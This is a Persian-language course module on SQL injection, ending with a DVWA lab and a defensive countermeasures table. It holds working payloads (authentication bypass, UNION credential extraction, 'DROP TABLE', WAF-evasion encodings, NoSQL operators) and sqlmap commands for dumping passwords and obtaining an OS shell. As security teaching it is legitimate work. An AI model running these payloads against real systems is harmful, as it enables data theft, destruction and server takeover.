# SQL Injection

**مدت یادگیری**: ۴ ساعت
**سطح سختی**: پیشرفته
**پیش‌نیاز**: فایل ۱۵ (وب) و آشنایی پایه با SQL

---

## فهرست محتوا

- [فصل ۱: مقدمه SQL](#فصل-۱-مقدمه-sql)
- [فصل ۲: انواع SQL Injection](#فصل-۲-انواع-sql-injection)
- [فصل ۳: کارگاه SQLMap](#فصل-۳-کارگاه-sqlmap)
- [فصل ۴: تکنیک‌های پیشرفته](#فصل-۴-تکنیکهای-پیشرفته)
- [فصل ۵: آزمایشگاه و اقدامات متقابل](#فصل-۵-آزمایشگاه-و-اقدامات-متقابل)

---

## فصل ۱: مقدمه SQL

### مقدمه

**SQL Injection (SQLi)** یکی از خطرناک‌ترین و رایج‌ترین آسیب‌پذیری‌های وب است. مهاجم با تزریق دستور SQL به ورودی، دیتابیس را دستکاری می‌کند.

> **تشبیه:** مثل این است که به گارسون بگویید «یک پیتزا»، اما او حرف شما را به آشپزخانه ببرد: «یک پیتزا + همه پول صندوق».

### مفاهیم اساسی

**SQL پایه:**
```sql
SELECT * FROM users WHERE username='admin' AND password='123';
INSERT INTO users (name) VALUES ('ali');
UPDATE users SET role='admin' WHERE id=1;
DELETE FROM users WHERE id=5;
UNION SELECT ...   -- ترکیب نتایج دو کوئری
```

**چرا SQLi رخ می‌دهد؟** وقتی ورودی کاربر **بدون پالایش** داخل کوئری قرار می‌گیرد:
```php
$query = "SELECT * FROM users WHERE user='$user'";
// اگر $user = ' OR '1'='1  →  همه رکوردها برمی‌گردد!
```

### مثال عملی

```sql
-- ورودی عادی: admin
SELECT * FROM users WHERE user='admin';

-- ورودی مخرب: ' OR '1'='1
SELECT * FROM users WHERE user='' OR '1'='1';
-- نتیجه: همه کاربران (شرط همیشه درست است)

-- دور زدن ورود:
-- username: admin' --
SELECT * FROM users WHERE user='admin' --' AND password='...';
-- بخش رمز کامنت می‌شود!
```

### نکات مهم (Tips & Tricks)

- `'` (تک‌کوتیشن) نشانه کلاسیک آسیب‌پذیری است.
- `--` یا `#` برای کامنت کردن بقیه کوئری.
- `' OR '1'='1` شرط همیشه درست.
- **Prepared Statements** دفاع اصلی است.

### خلاصه فصل

- SQLi = تزریق دستور SQL به ورودی.
- علت: عدم پالایش ورودی.
- Prepared Statement بهترین دفاع.

---

## فصل ۲: انواع SQL Injection

### مقدمه

SQLi انواع مختلفی دارد که بسته به موقعیت و کانال تشخیص داده می‌شوند.

### مفاهیم اساسی

**۱. In-band (کلاسیک):**
- **Error-based:** استخراج اطلاعات از پیام‌های خطا.
- **Union-based:** ترکیب نتایج با `UNION SELECT`.

**۲. Blind (کور):**
- **Boolean-based:** پاسخ درست/غلط.
- **Time-based:** تأخیر زمانی (`SLEEP(5)`).

**۳. Out-of-band:** استخراج از طریق کانال دیگر (DNS/HTTP).

**۴. Second-order:** تزریق ذخیره‌شده که بعداً اجرا می‌شود.

### مثال عملی

```sql
-- === Error-based ===
' AND 1=CONVERT(int, @@version) --
-- خطا نسخه دیتابیس را لو می‌دهد

-- === Union-based ===
' UNION SELECT null, username, password FROM users --
' UNION SELECT 1, table_name, 3 FROM information_schema.tables --

-- === Boolean-based (Blind) ===
' AND 1=1 --    (صفحه عادی)
' AND 1=2 --    (صفحه تغییر می‌کند)
' AND SUBSTRING((SELECT database()),1,1)='a' --

-- === Time-based (Blind) ===
' AND IF(1=1, SLEEP(5), 0) --
' ; WAITFOR DELAY '0:0:5' --   (MSSQL)

-- === کشف ساختار ===
' UNION SELECT 1,2,3 --   (تعداد ستون‌ها را پیدا کن)
```

### اشکال شایع

- **مشکل:** UNION با تعداد ستون اشتباه → با `ORDER BY` تعداد ستون را کشف کنید.
- **مشکل:** Error-based خطا نمی‌دهد → از Blind استفاده کنید.
- **مشکل:** Time-based کند است → صبور باشید یا خودکارسازی کنید.

### نکات مهم (Tips & Tricks)

- **information_schema** گنجینه ساختار دیتابیس است (جدول‌ها و ستون‌ها).
- `ORDER BY 1,2,3...` تا خطا، تعداد ستون را مشخص می‌کند.
- **Time-based** آخرین راه‌حل است اما همیشه کار می‌کند.
- **DBMS Fingerprinting:** MySQL، MSSQL، PostgreSQL، Oracle هرکدام syntax خاص دارند.

### خلاصه فصل

- In-band (Error/Union)، Blind (Boolean/Time)، Out-of-band، Second-order.
- کشف تعداد ستون و ساختار دیتابیس گام اول است.
- information_schema مرجع ساختار است.

---

## فصل ۳: کارگاه SQLMap

### مقدمه

**SQLMap** ابزار خودکارسازی SQLi است. کشف، استخراج و حتی گرفتن شل با آن ممکن است.

### مفاهیم اساسی

**قابلیت‌ها:**
- کشف خودکار نوع تزریق.
- استخراج دیتابیس، جدول، ستون و داده.
- دور زدن WAF.
- گرفتن Shell سیستمی.
- File Read/Write.

### مثال عملی

```bash
# === تست پایه ===
sqlmap -u "http://target/page.php?id=1"

# === با کوکی (نشست احراز هویت‌شده) ===
sqlmap -u "http://target/page.php?id=1" --cookie="PHPSESSID=abc123"

# === از فایل درخواست (Burp) ===
sqlmap -r request.txt

# === کشف دیتابیس‌ها ===
sqlmap -u "http://target/page.php?id=1" --dbs

# === کشف جدول‌ها ===
sqlmap -u "http://target/page.php?id=1" -D dbname --tables

# === کشف ستون‌ها ===
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --columns

# === استخراج داده ===
sqlmap -u "http://target/page.php?id=1" -D dbname -T users -C username,password --dump

# === گرفتن Shell ===
sqlmap -u "http://target/page.php?id=1" --os-shell

# === دور زدن WAF ===
sqlmap -u "http://target/page.php?id=1" --tamper=space2comment --random-agent

# === افزایش سطح و ریسک ===
sqlmap -u "http://target/page.php?id=1" --level=5 --risk=3
```

### اشکال شایع

- **مشکل:** SQLMap چیزی پیدا نمی‌کند → `--level` و `--risk` را بالا ببرید.
- **مشکل:** WAF بلاک می‌کند → از `--tamper` استفاده کنید.
- **مشکل:** درخواست POST را نمی‌فهمد → با `--data` یا `-r` مشخص کنید.

### نکات مهم (Tips & Tricks)

- **`-r request.txt`** بهترین روش است (درخواست کامل از Burp).
- **`--batch`** برای اجرای خودکار بدون سوال.
- **`--tamper`** برای دور زدن WAF (چند tamper را ترکیب کنید).
- `--level=5 --risk=3` جامع‌ترین اما پرخطرترین حالت است.

### خلاصه فصل

- SQLMap کشف و استخراج خودکار.
- `-r` برای درخواست کامل، `--dump` برای داده.
- tamper برای WAF، level/risk برای عمق.

---

## فصل ۴: تکنیک‌های پیشرفته

### مقدمه

در محیط‌های واقعی، WAF و فیلترها مانع می‌شوند. تکنیک‌های پیشرفته لازم است.

### مفاهیم اساسی

**دور زدن فیلترها:**
- **Comment Injection:** `/**/` جای فاصله.
- **Case Variation:** `SeLeCt`.
- **Encoding:** URL، Hex، Unicode.
- **Keyword Splitting:** `SEL/**/ECT`.
- **Alternative Operators:** `||`, `&&`.
- **Whitespace Bypass:** tab، newline، `%0a`.

**تکنیک‌های دیگر:**
- **Stacked Queries:** چند کوئری با `;`.
- **Second-order:** ذخیره و اجرای بعدی.
- **NoSQL Injection:** MongoDB (`$ne`, `$gt`).

### مثال عملی

```sql
-- === دور زدن فاصله ===
'/**/OR/**/1=1--

-- === دور زدن با انکودینگ ===
%27%20OR%201%3D1--

-- === Stacked Query ===
'; DROP TABLE users; --

-- === NoSQL Injection (MongoDB) ===
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}

-- === دور زدن فیلتر کلمه کلیدی ===
' UNION/**/SELECT/**/1,2,3--
```

### اشکال شایع

- **مشکل:** WAF همه چیز را می‌گیرد → ترکیب چند تکنیک + tamperهای SQLMap.
- **مشکل:** پارامتر عددی است → بدون کوتیشن تست کنید (`1 OR 1=1`).
- **مشکل:** NoSQL متفاوت است → syntax JSON را یاد بگیرید.

### نکات مهم (Tips & Tricks)

- **WAF Fingerprinting:** نوع WAF را تشخیص دهید تا bypass مناسب پیدا کنید.
- **`sqlmap --tamper`** مجموعه بزرگی از bypassها دارد.
- **Second-order** اغلب نادیده گرفته می‌شود.
- همیشه **مجوز** داشته باشید.

### خلاصه فصل

- دور زدن فیلتر: Comment، Encoding، Case، Splitting.
- Stacked Query، Second-order، NoSQL.
- WAF Fingerprinting کلید bypass است.

---

## فصل ۵: آزمایشگاه و اقدامات متقابل

### مقدمه

یک آزمایشگاه کامل SQLi روی DVWA.

### مثال عملی — آزمایشگاه

```bash
# === آماده‌سازی ===
# DVWA → SQL Injection (سطح Low)
# URL: http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

# === ۱. تست دستی ===
# id=1' → خطا (آسیب‌پذیر)
# id=1' OR '1'='1 → همه کاربران

# === ۲. کشف تعداد ستون ===
# id=1' ORDER BY 1 -- 
# id=1' ORDER BY 2 --
# id=1' ORDER BY 3 --   (خطا → ۲ ستون)

# === ۳. Union-based ===
# id=1' UNION SELECT user, password FROM users --

# === ۴. SQLMap ===
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=low" --dbs --batch

sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=low" -D dvwa -T users --dump --batch

# === ۵. گرفتن Shell ===
sqlmap -u "..." --cookie="..." --os-shell
```

### اشکال شایع

- **مشکل:** SQLMap کوکی نمی‌فرستد → `--cookie` را کامل پر کنید.
- **مشکل:** DVWA سطح High → روی Low تمرین کنید اول.

### نکات مهم (Tips & Tricks)

- همیشه **از ساده به پیچیده** بروید.
- درخواست را از Burp بگیرید و با `-r` به SQLMap بدهید.
- یافته‌ها را با PoC مستند کنید.

### اقدامات متقابل (Countermeasures)

| تکنیک | راهکار |
|-------|--------|
| تمام انواع SQLi | Prepared Statements / Parameterized Queries |
| Error-based | غیرفعال‌سازی پیام خطای دیتابیس |
| Union-based | اعتبارسنجی نوع داده ورودی |
| Blind | حداقل دسترسی دیتابیس کاربر |
| WAF Bypass | WAF + پالایش سمت سرور |
| NoSQL | اعتبارسنجی ساختار ورودی |

**کد امن (PHP PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
// ورودی هرگز مستقیماً داخل کوئری قرار نمی‌گیرد
```

### خلاصه فصل

- آزمایشگاه: تست دستی → Union → SQLMap → Shell.
- DVWA سطح Low برای شروع.
- Prepared Statement بهترین دفاع.

---

## منابع و مراجع

- **OWASP SQL Injection:** https://owasp.org/www-community/attacks/SQL_Injection
- **SQLMap:** https://sqlmap.org/
- **PortSwigger SQLi Labs:** https://portswigger.net/web-security/sql-injection
- **PayloadsAllTheThings — SQLi:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **DVWA:** https://github.com/digininja/DVWA
- **SQLi Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
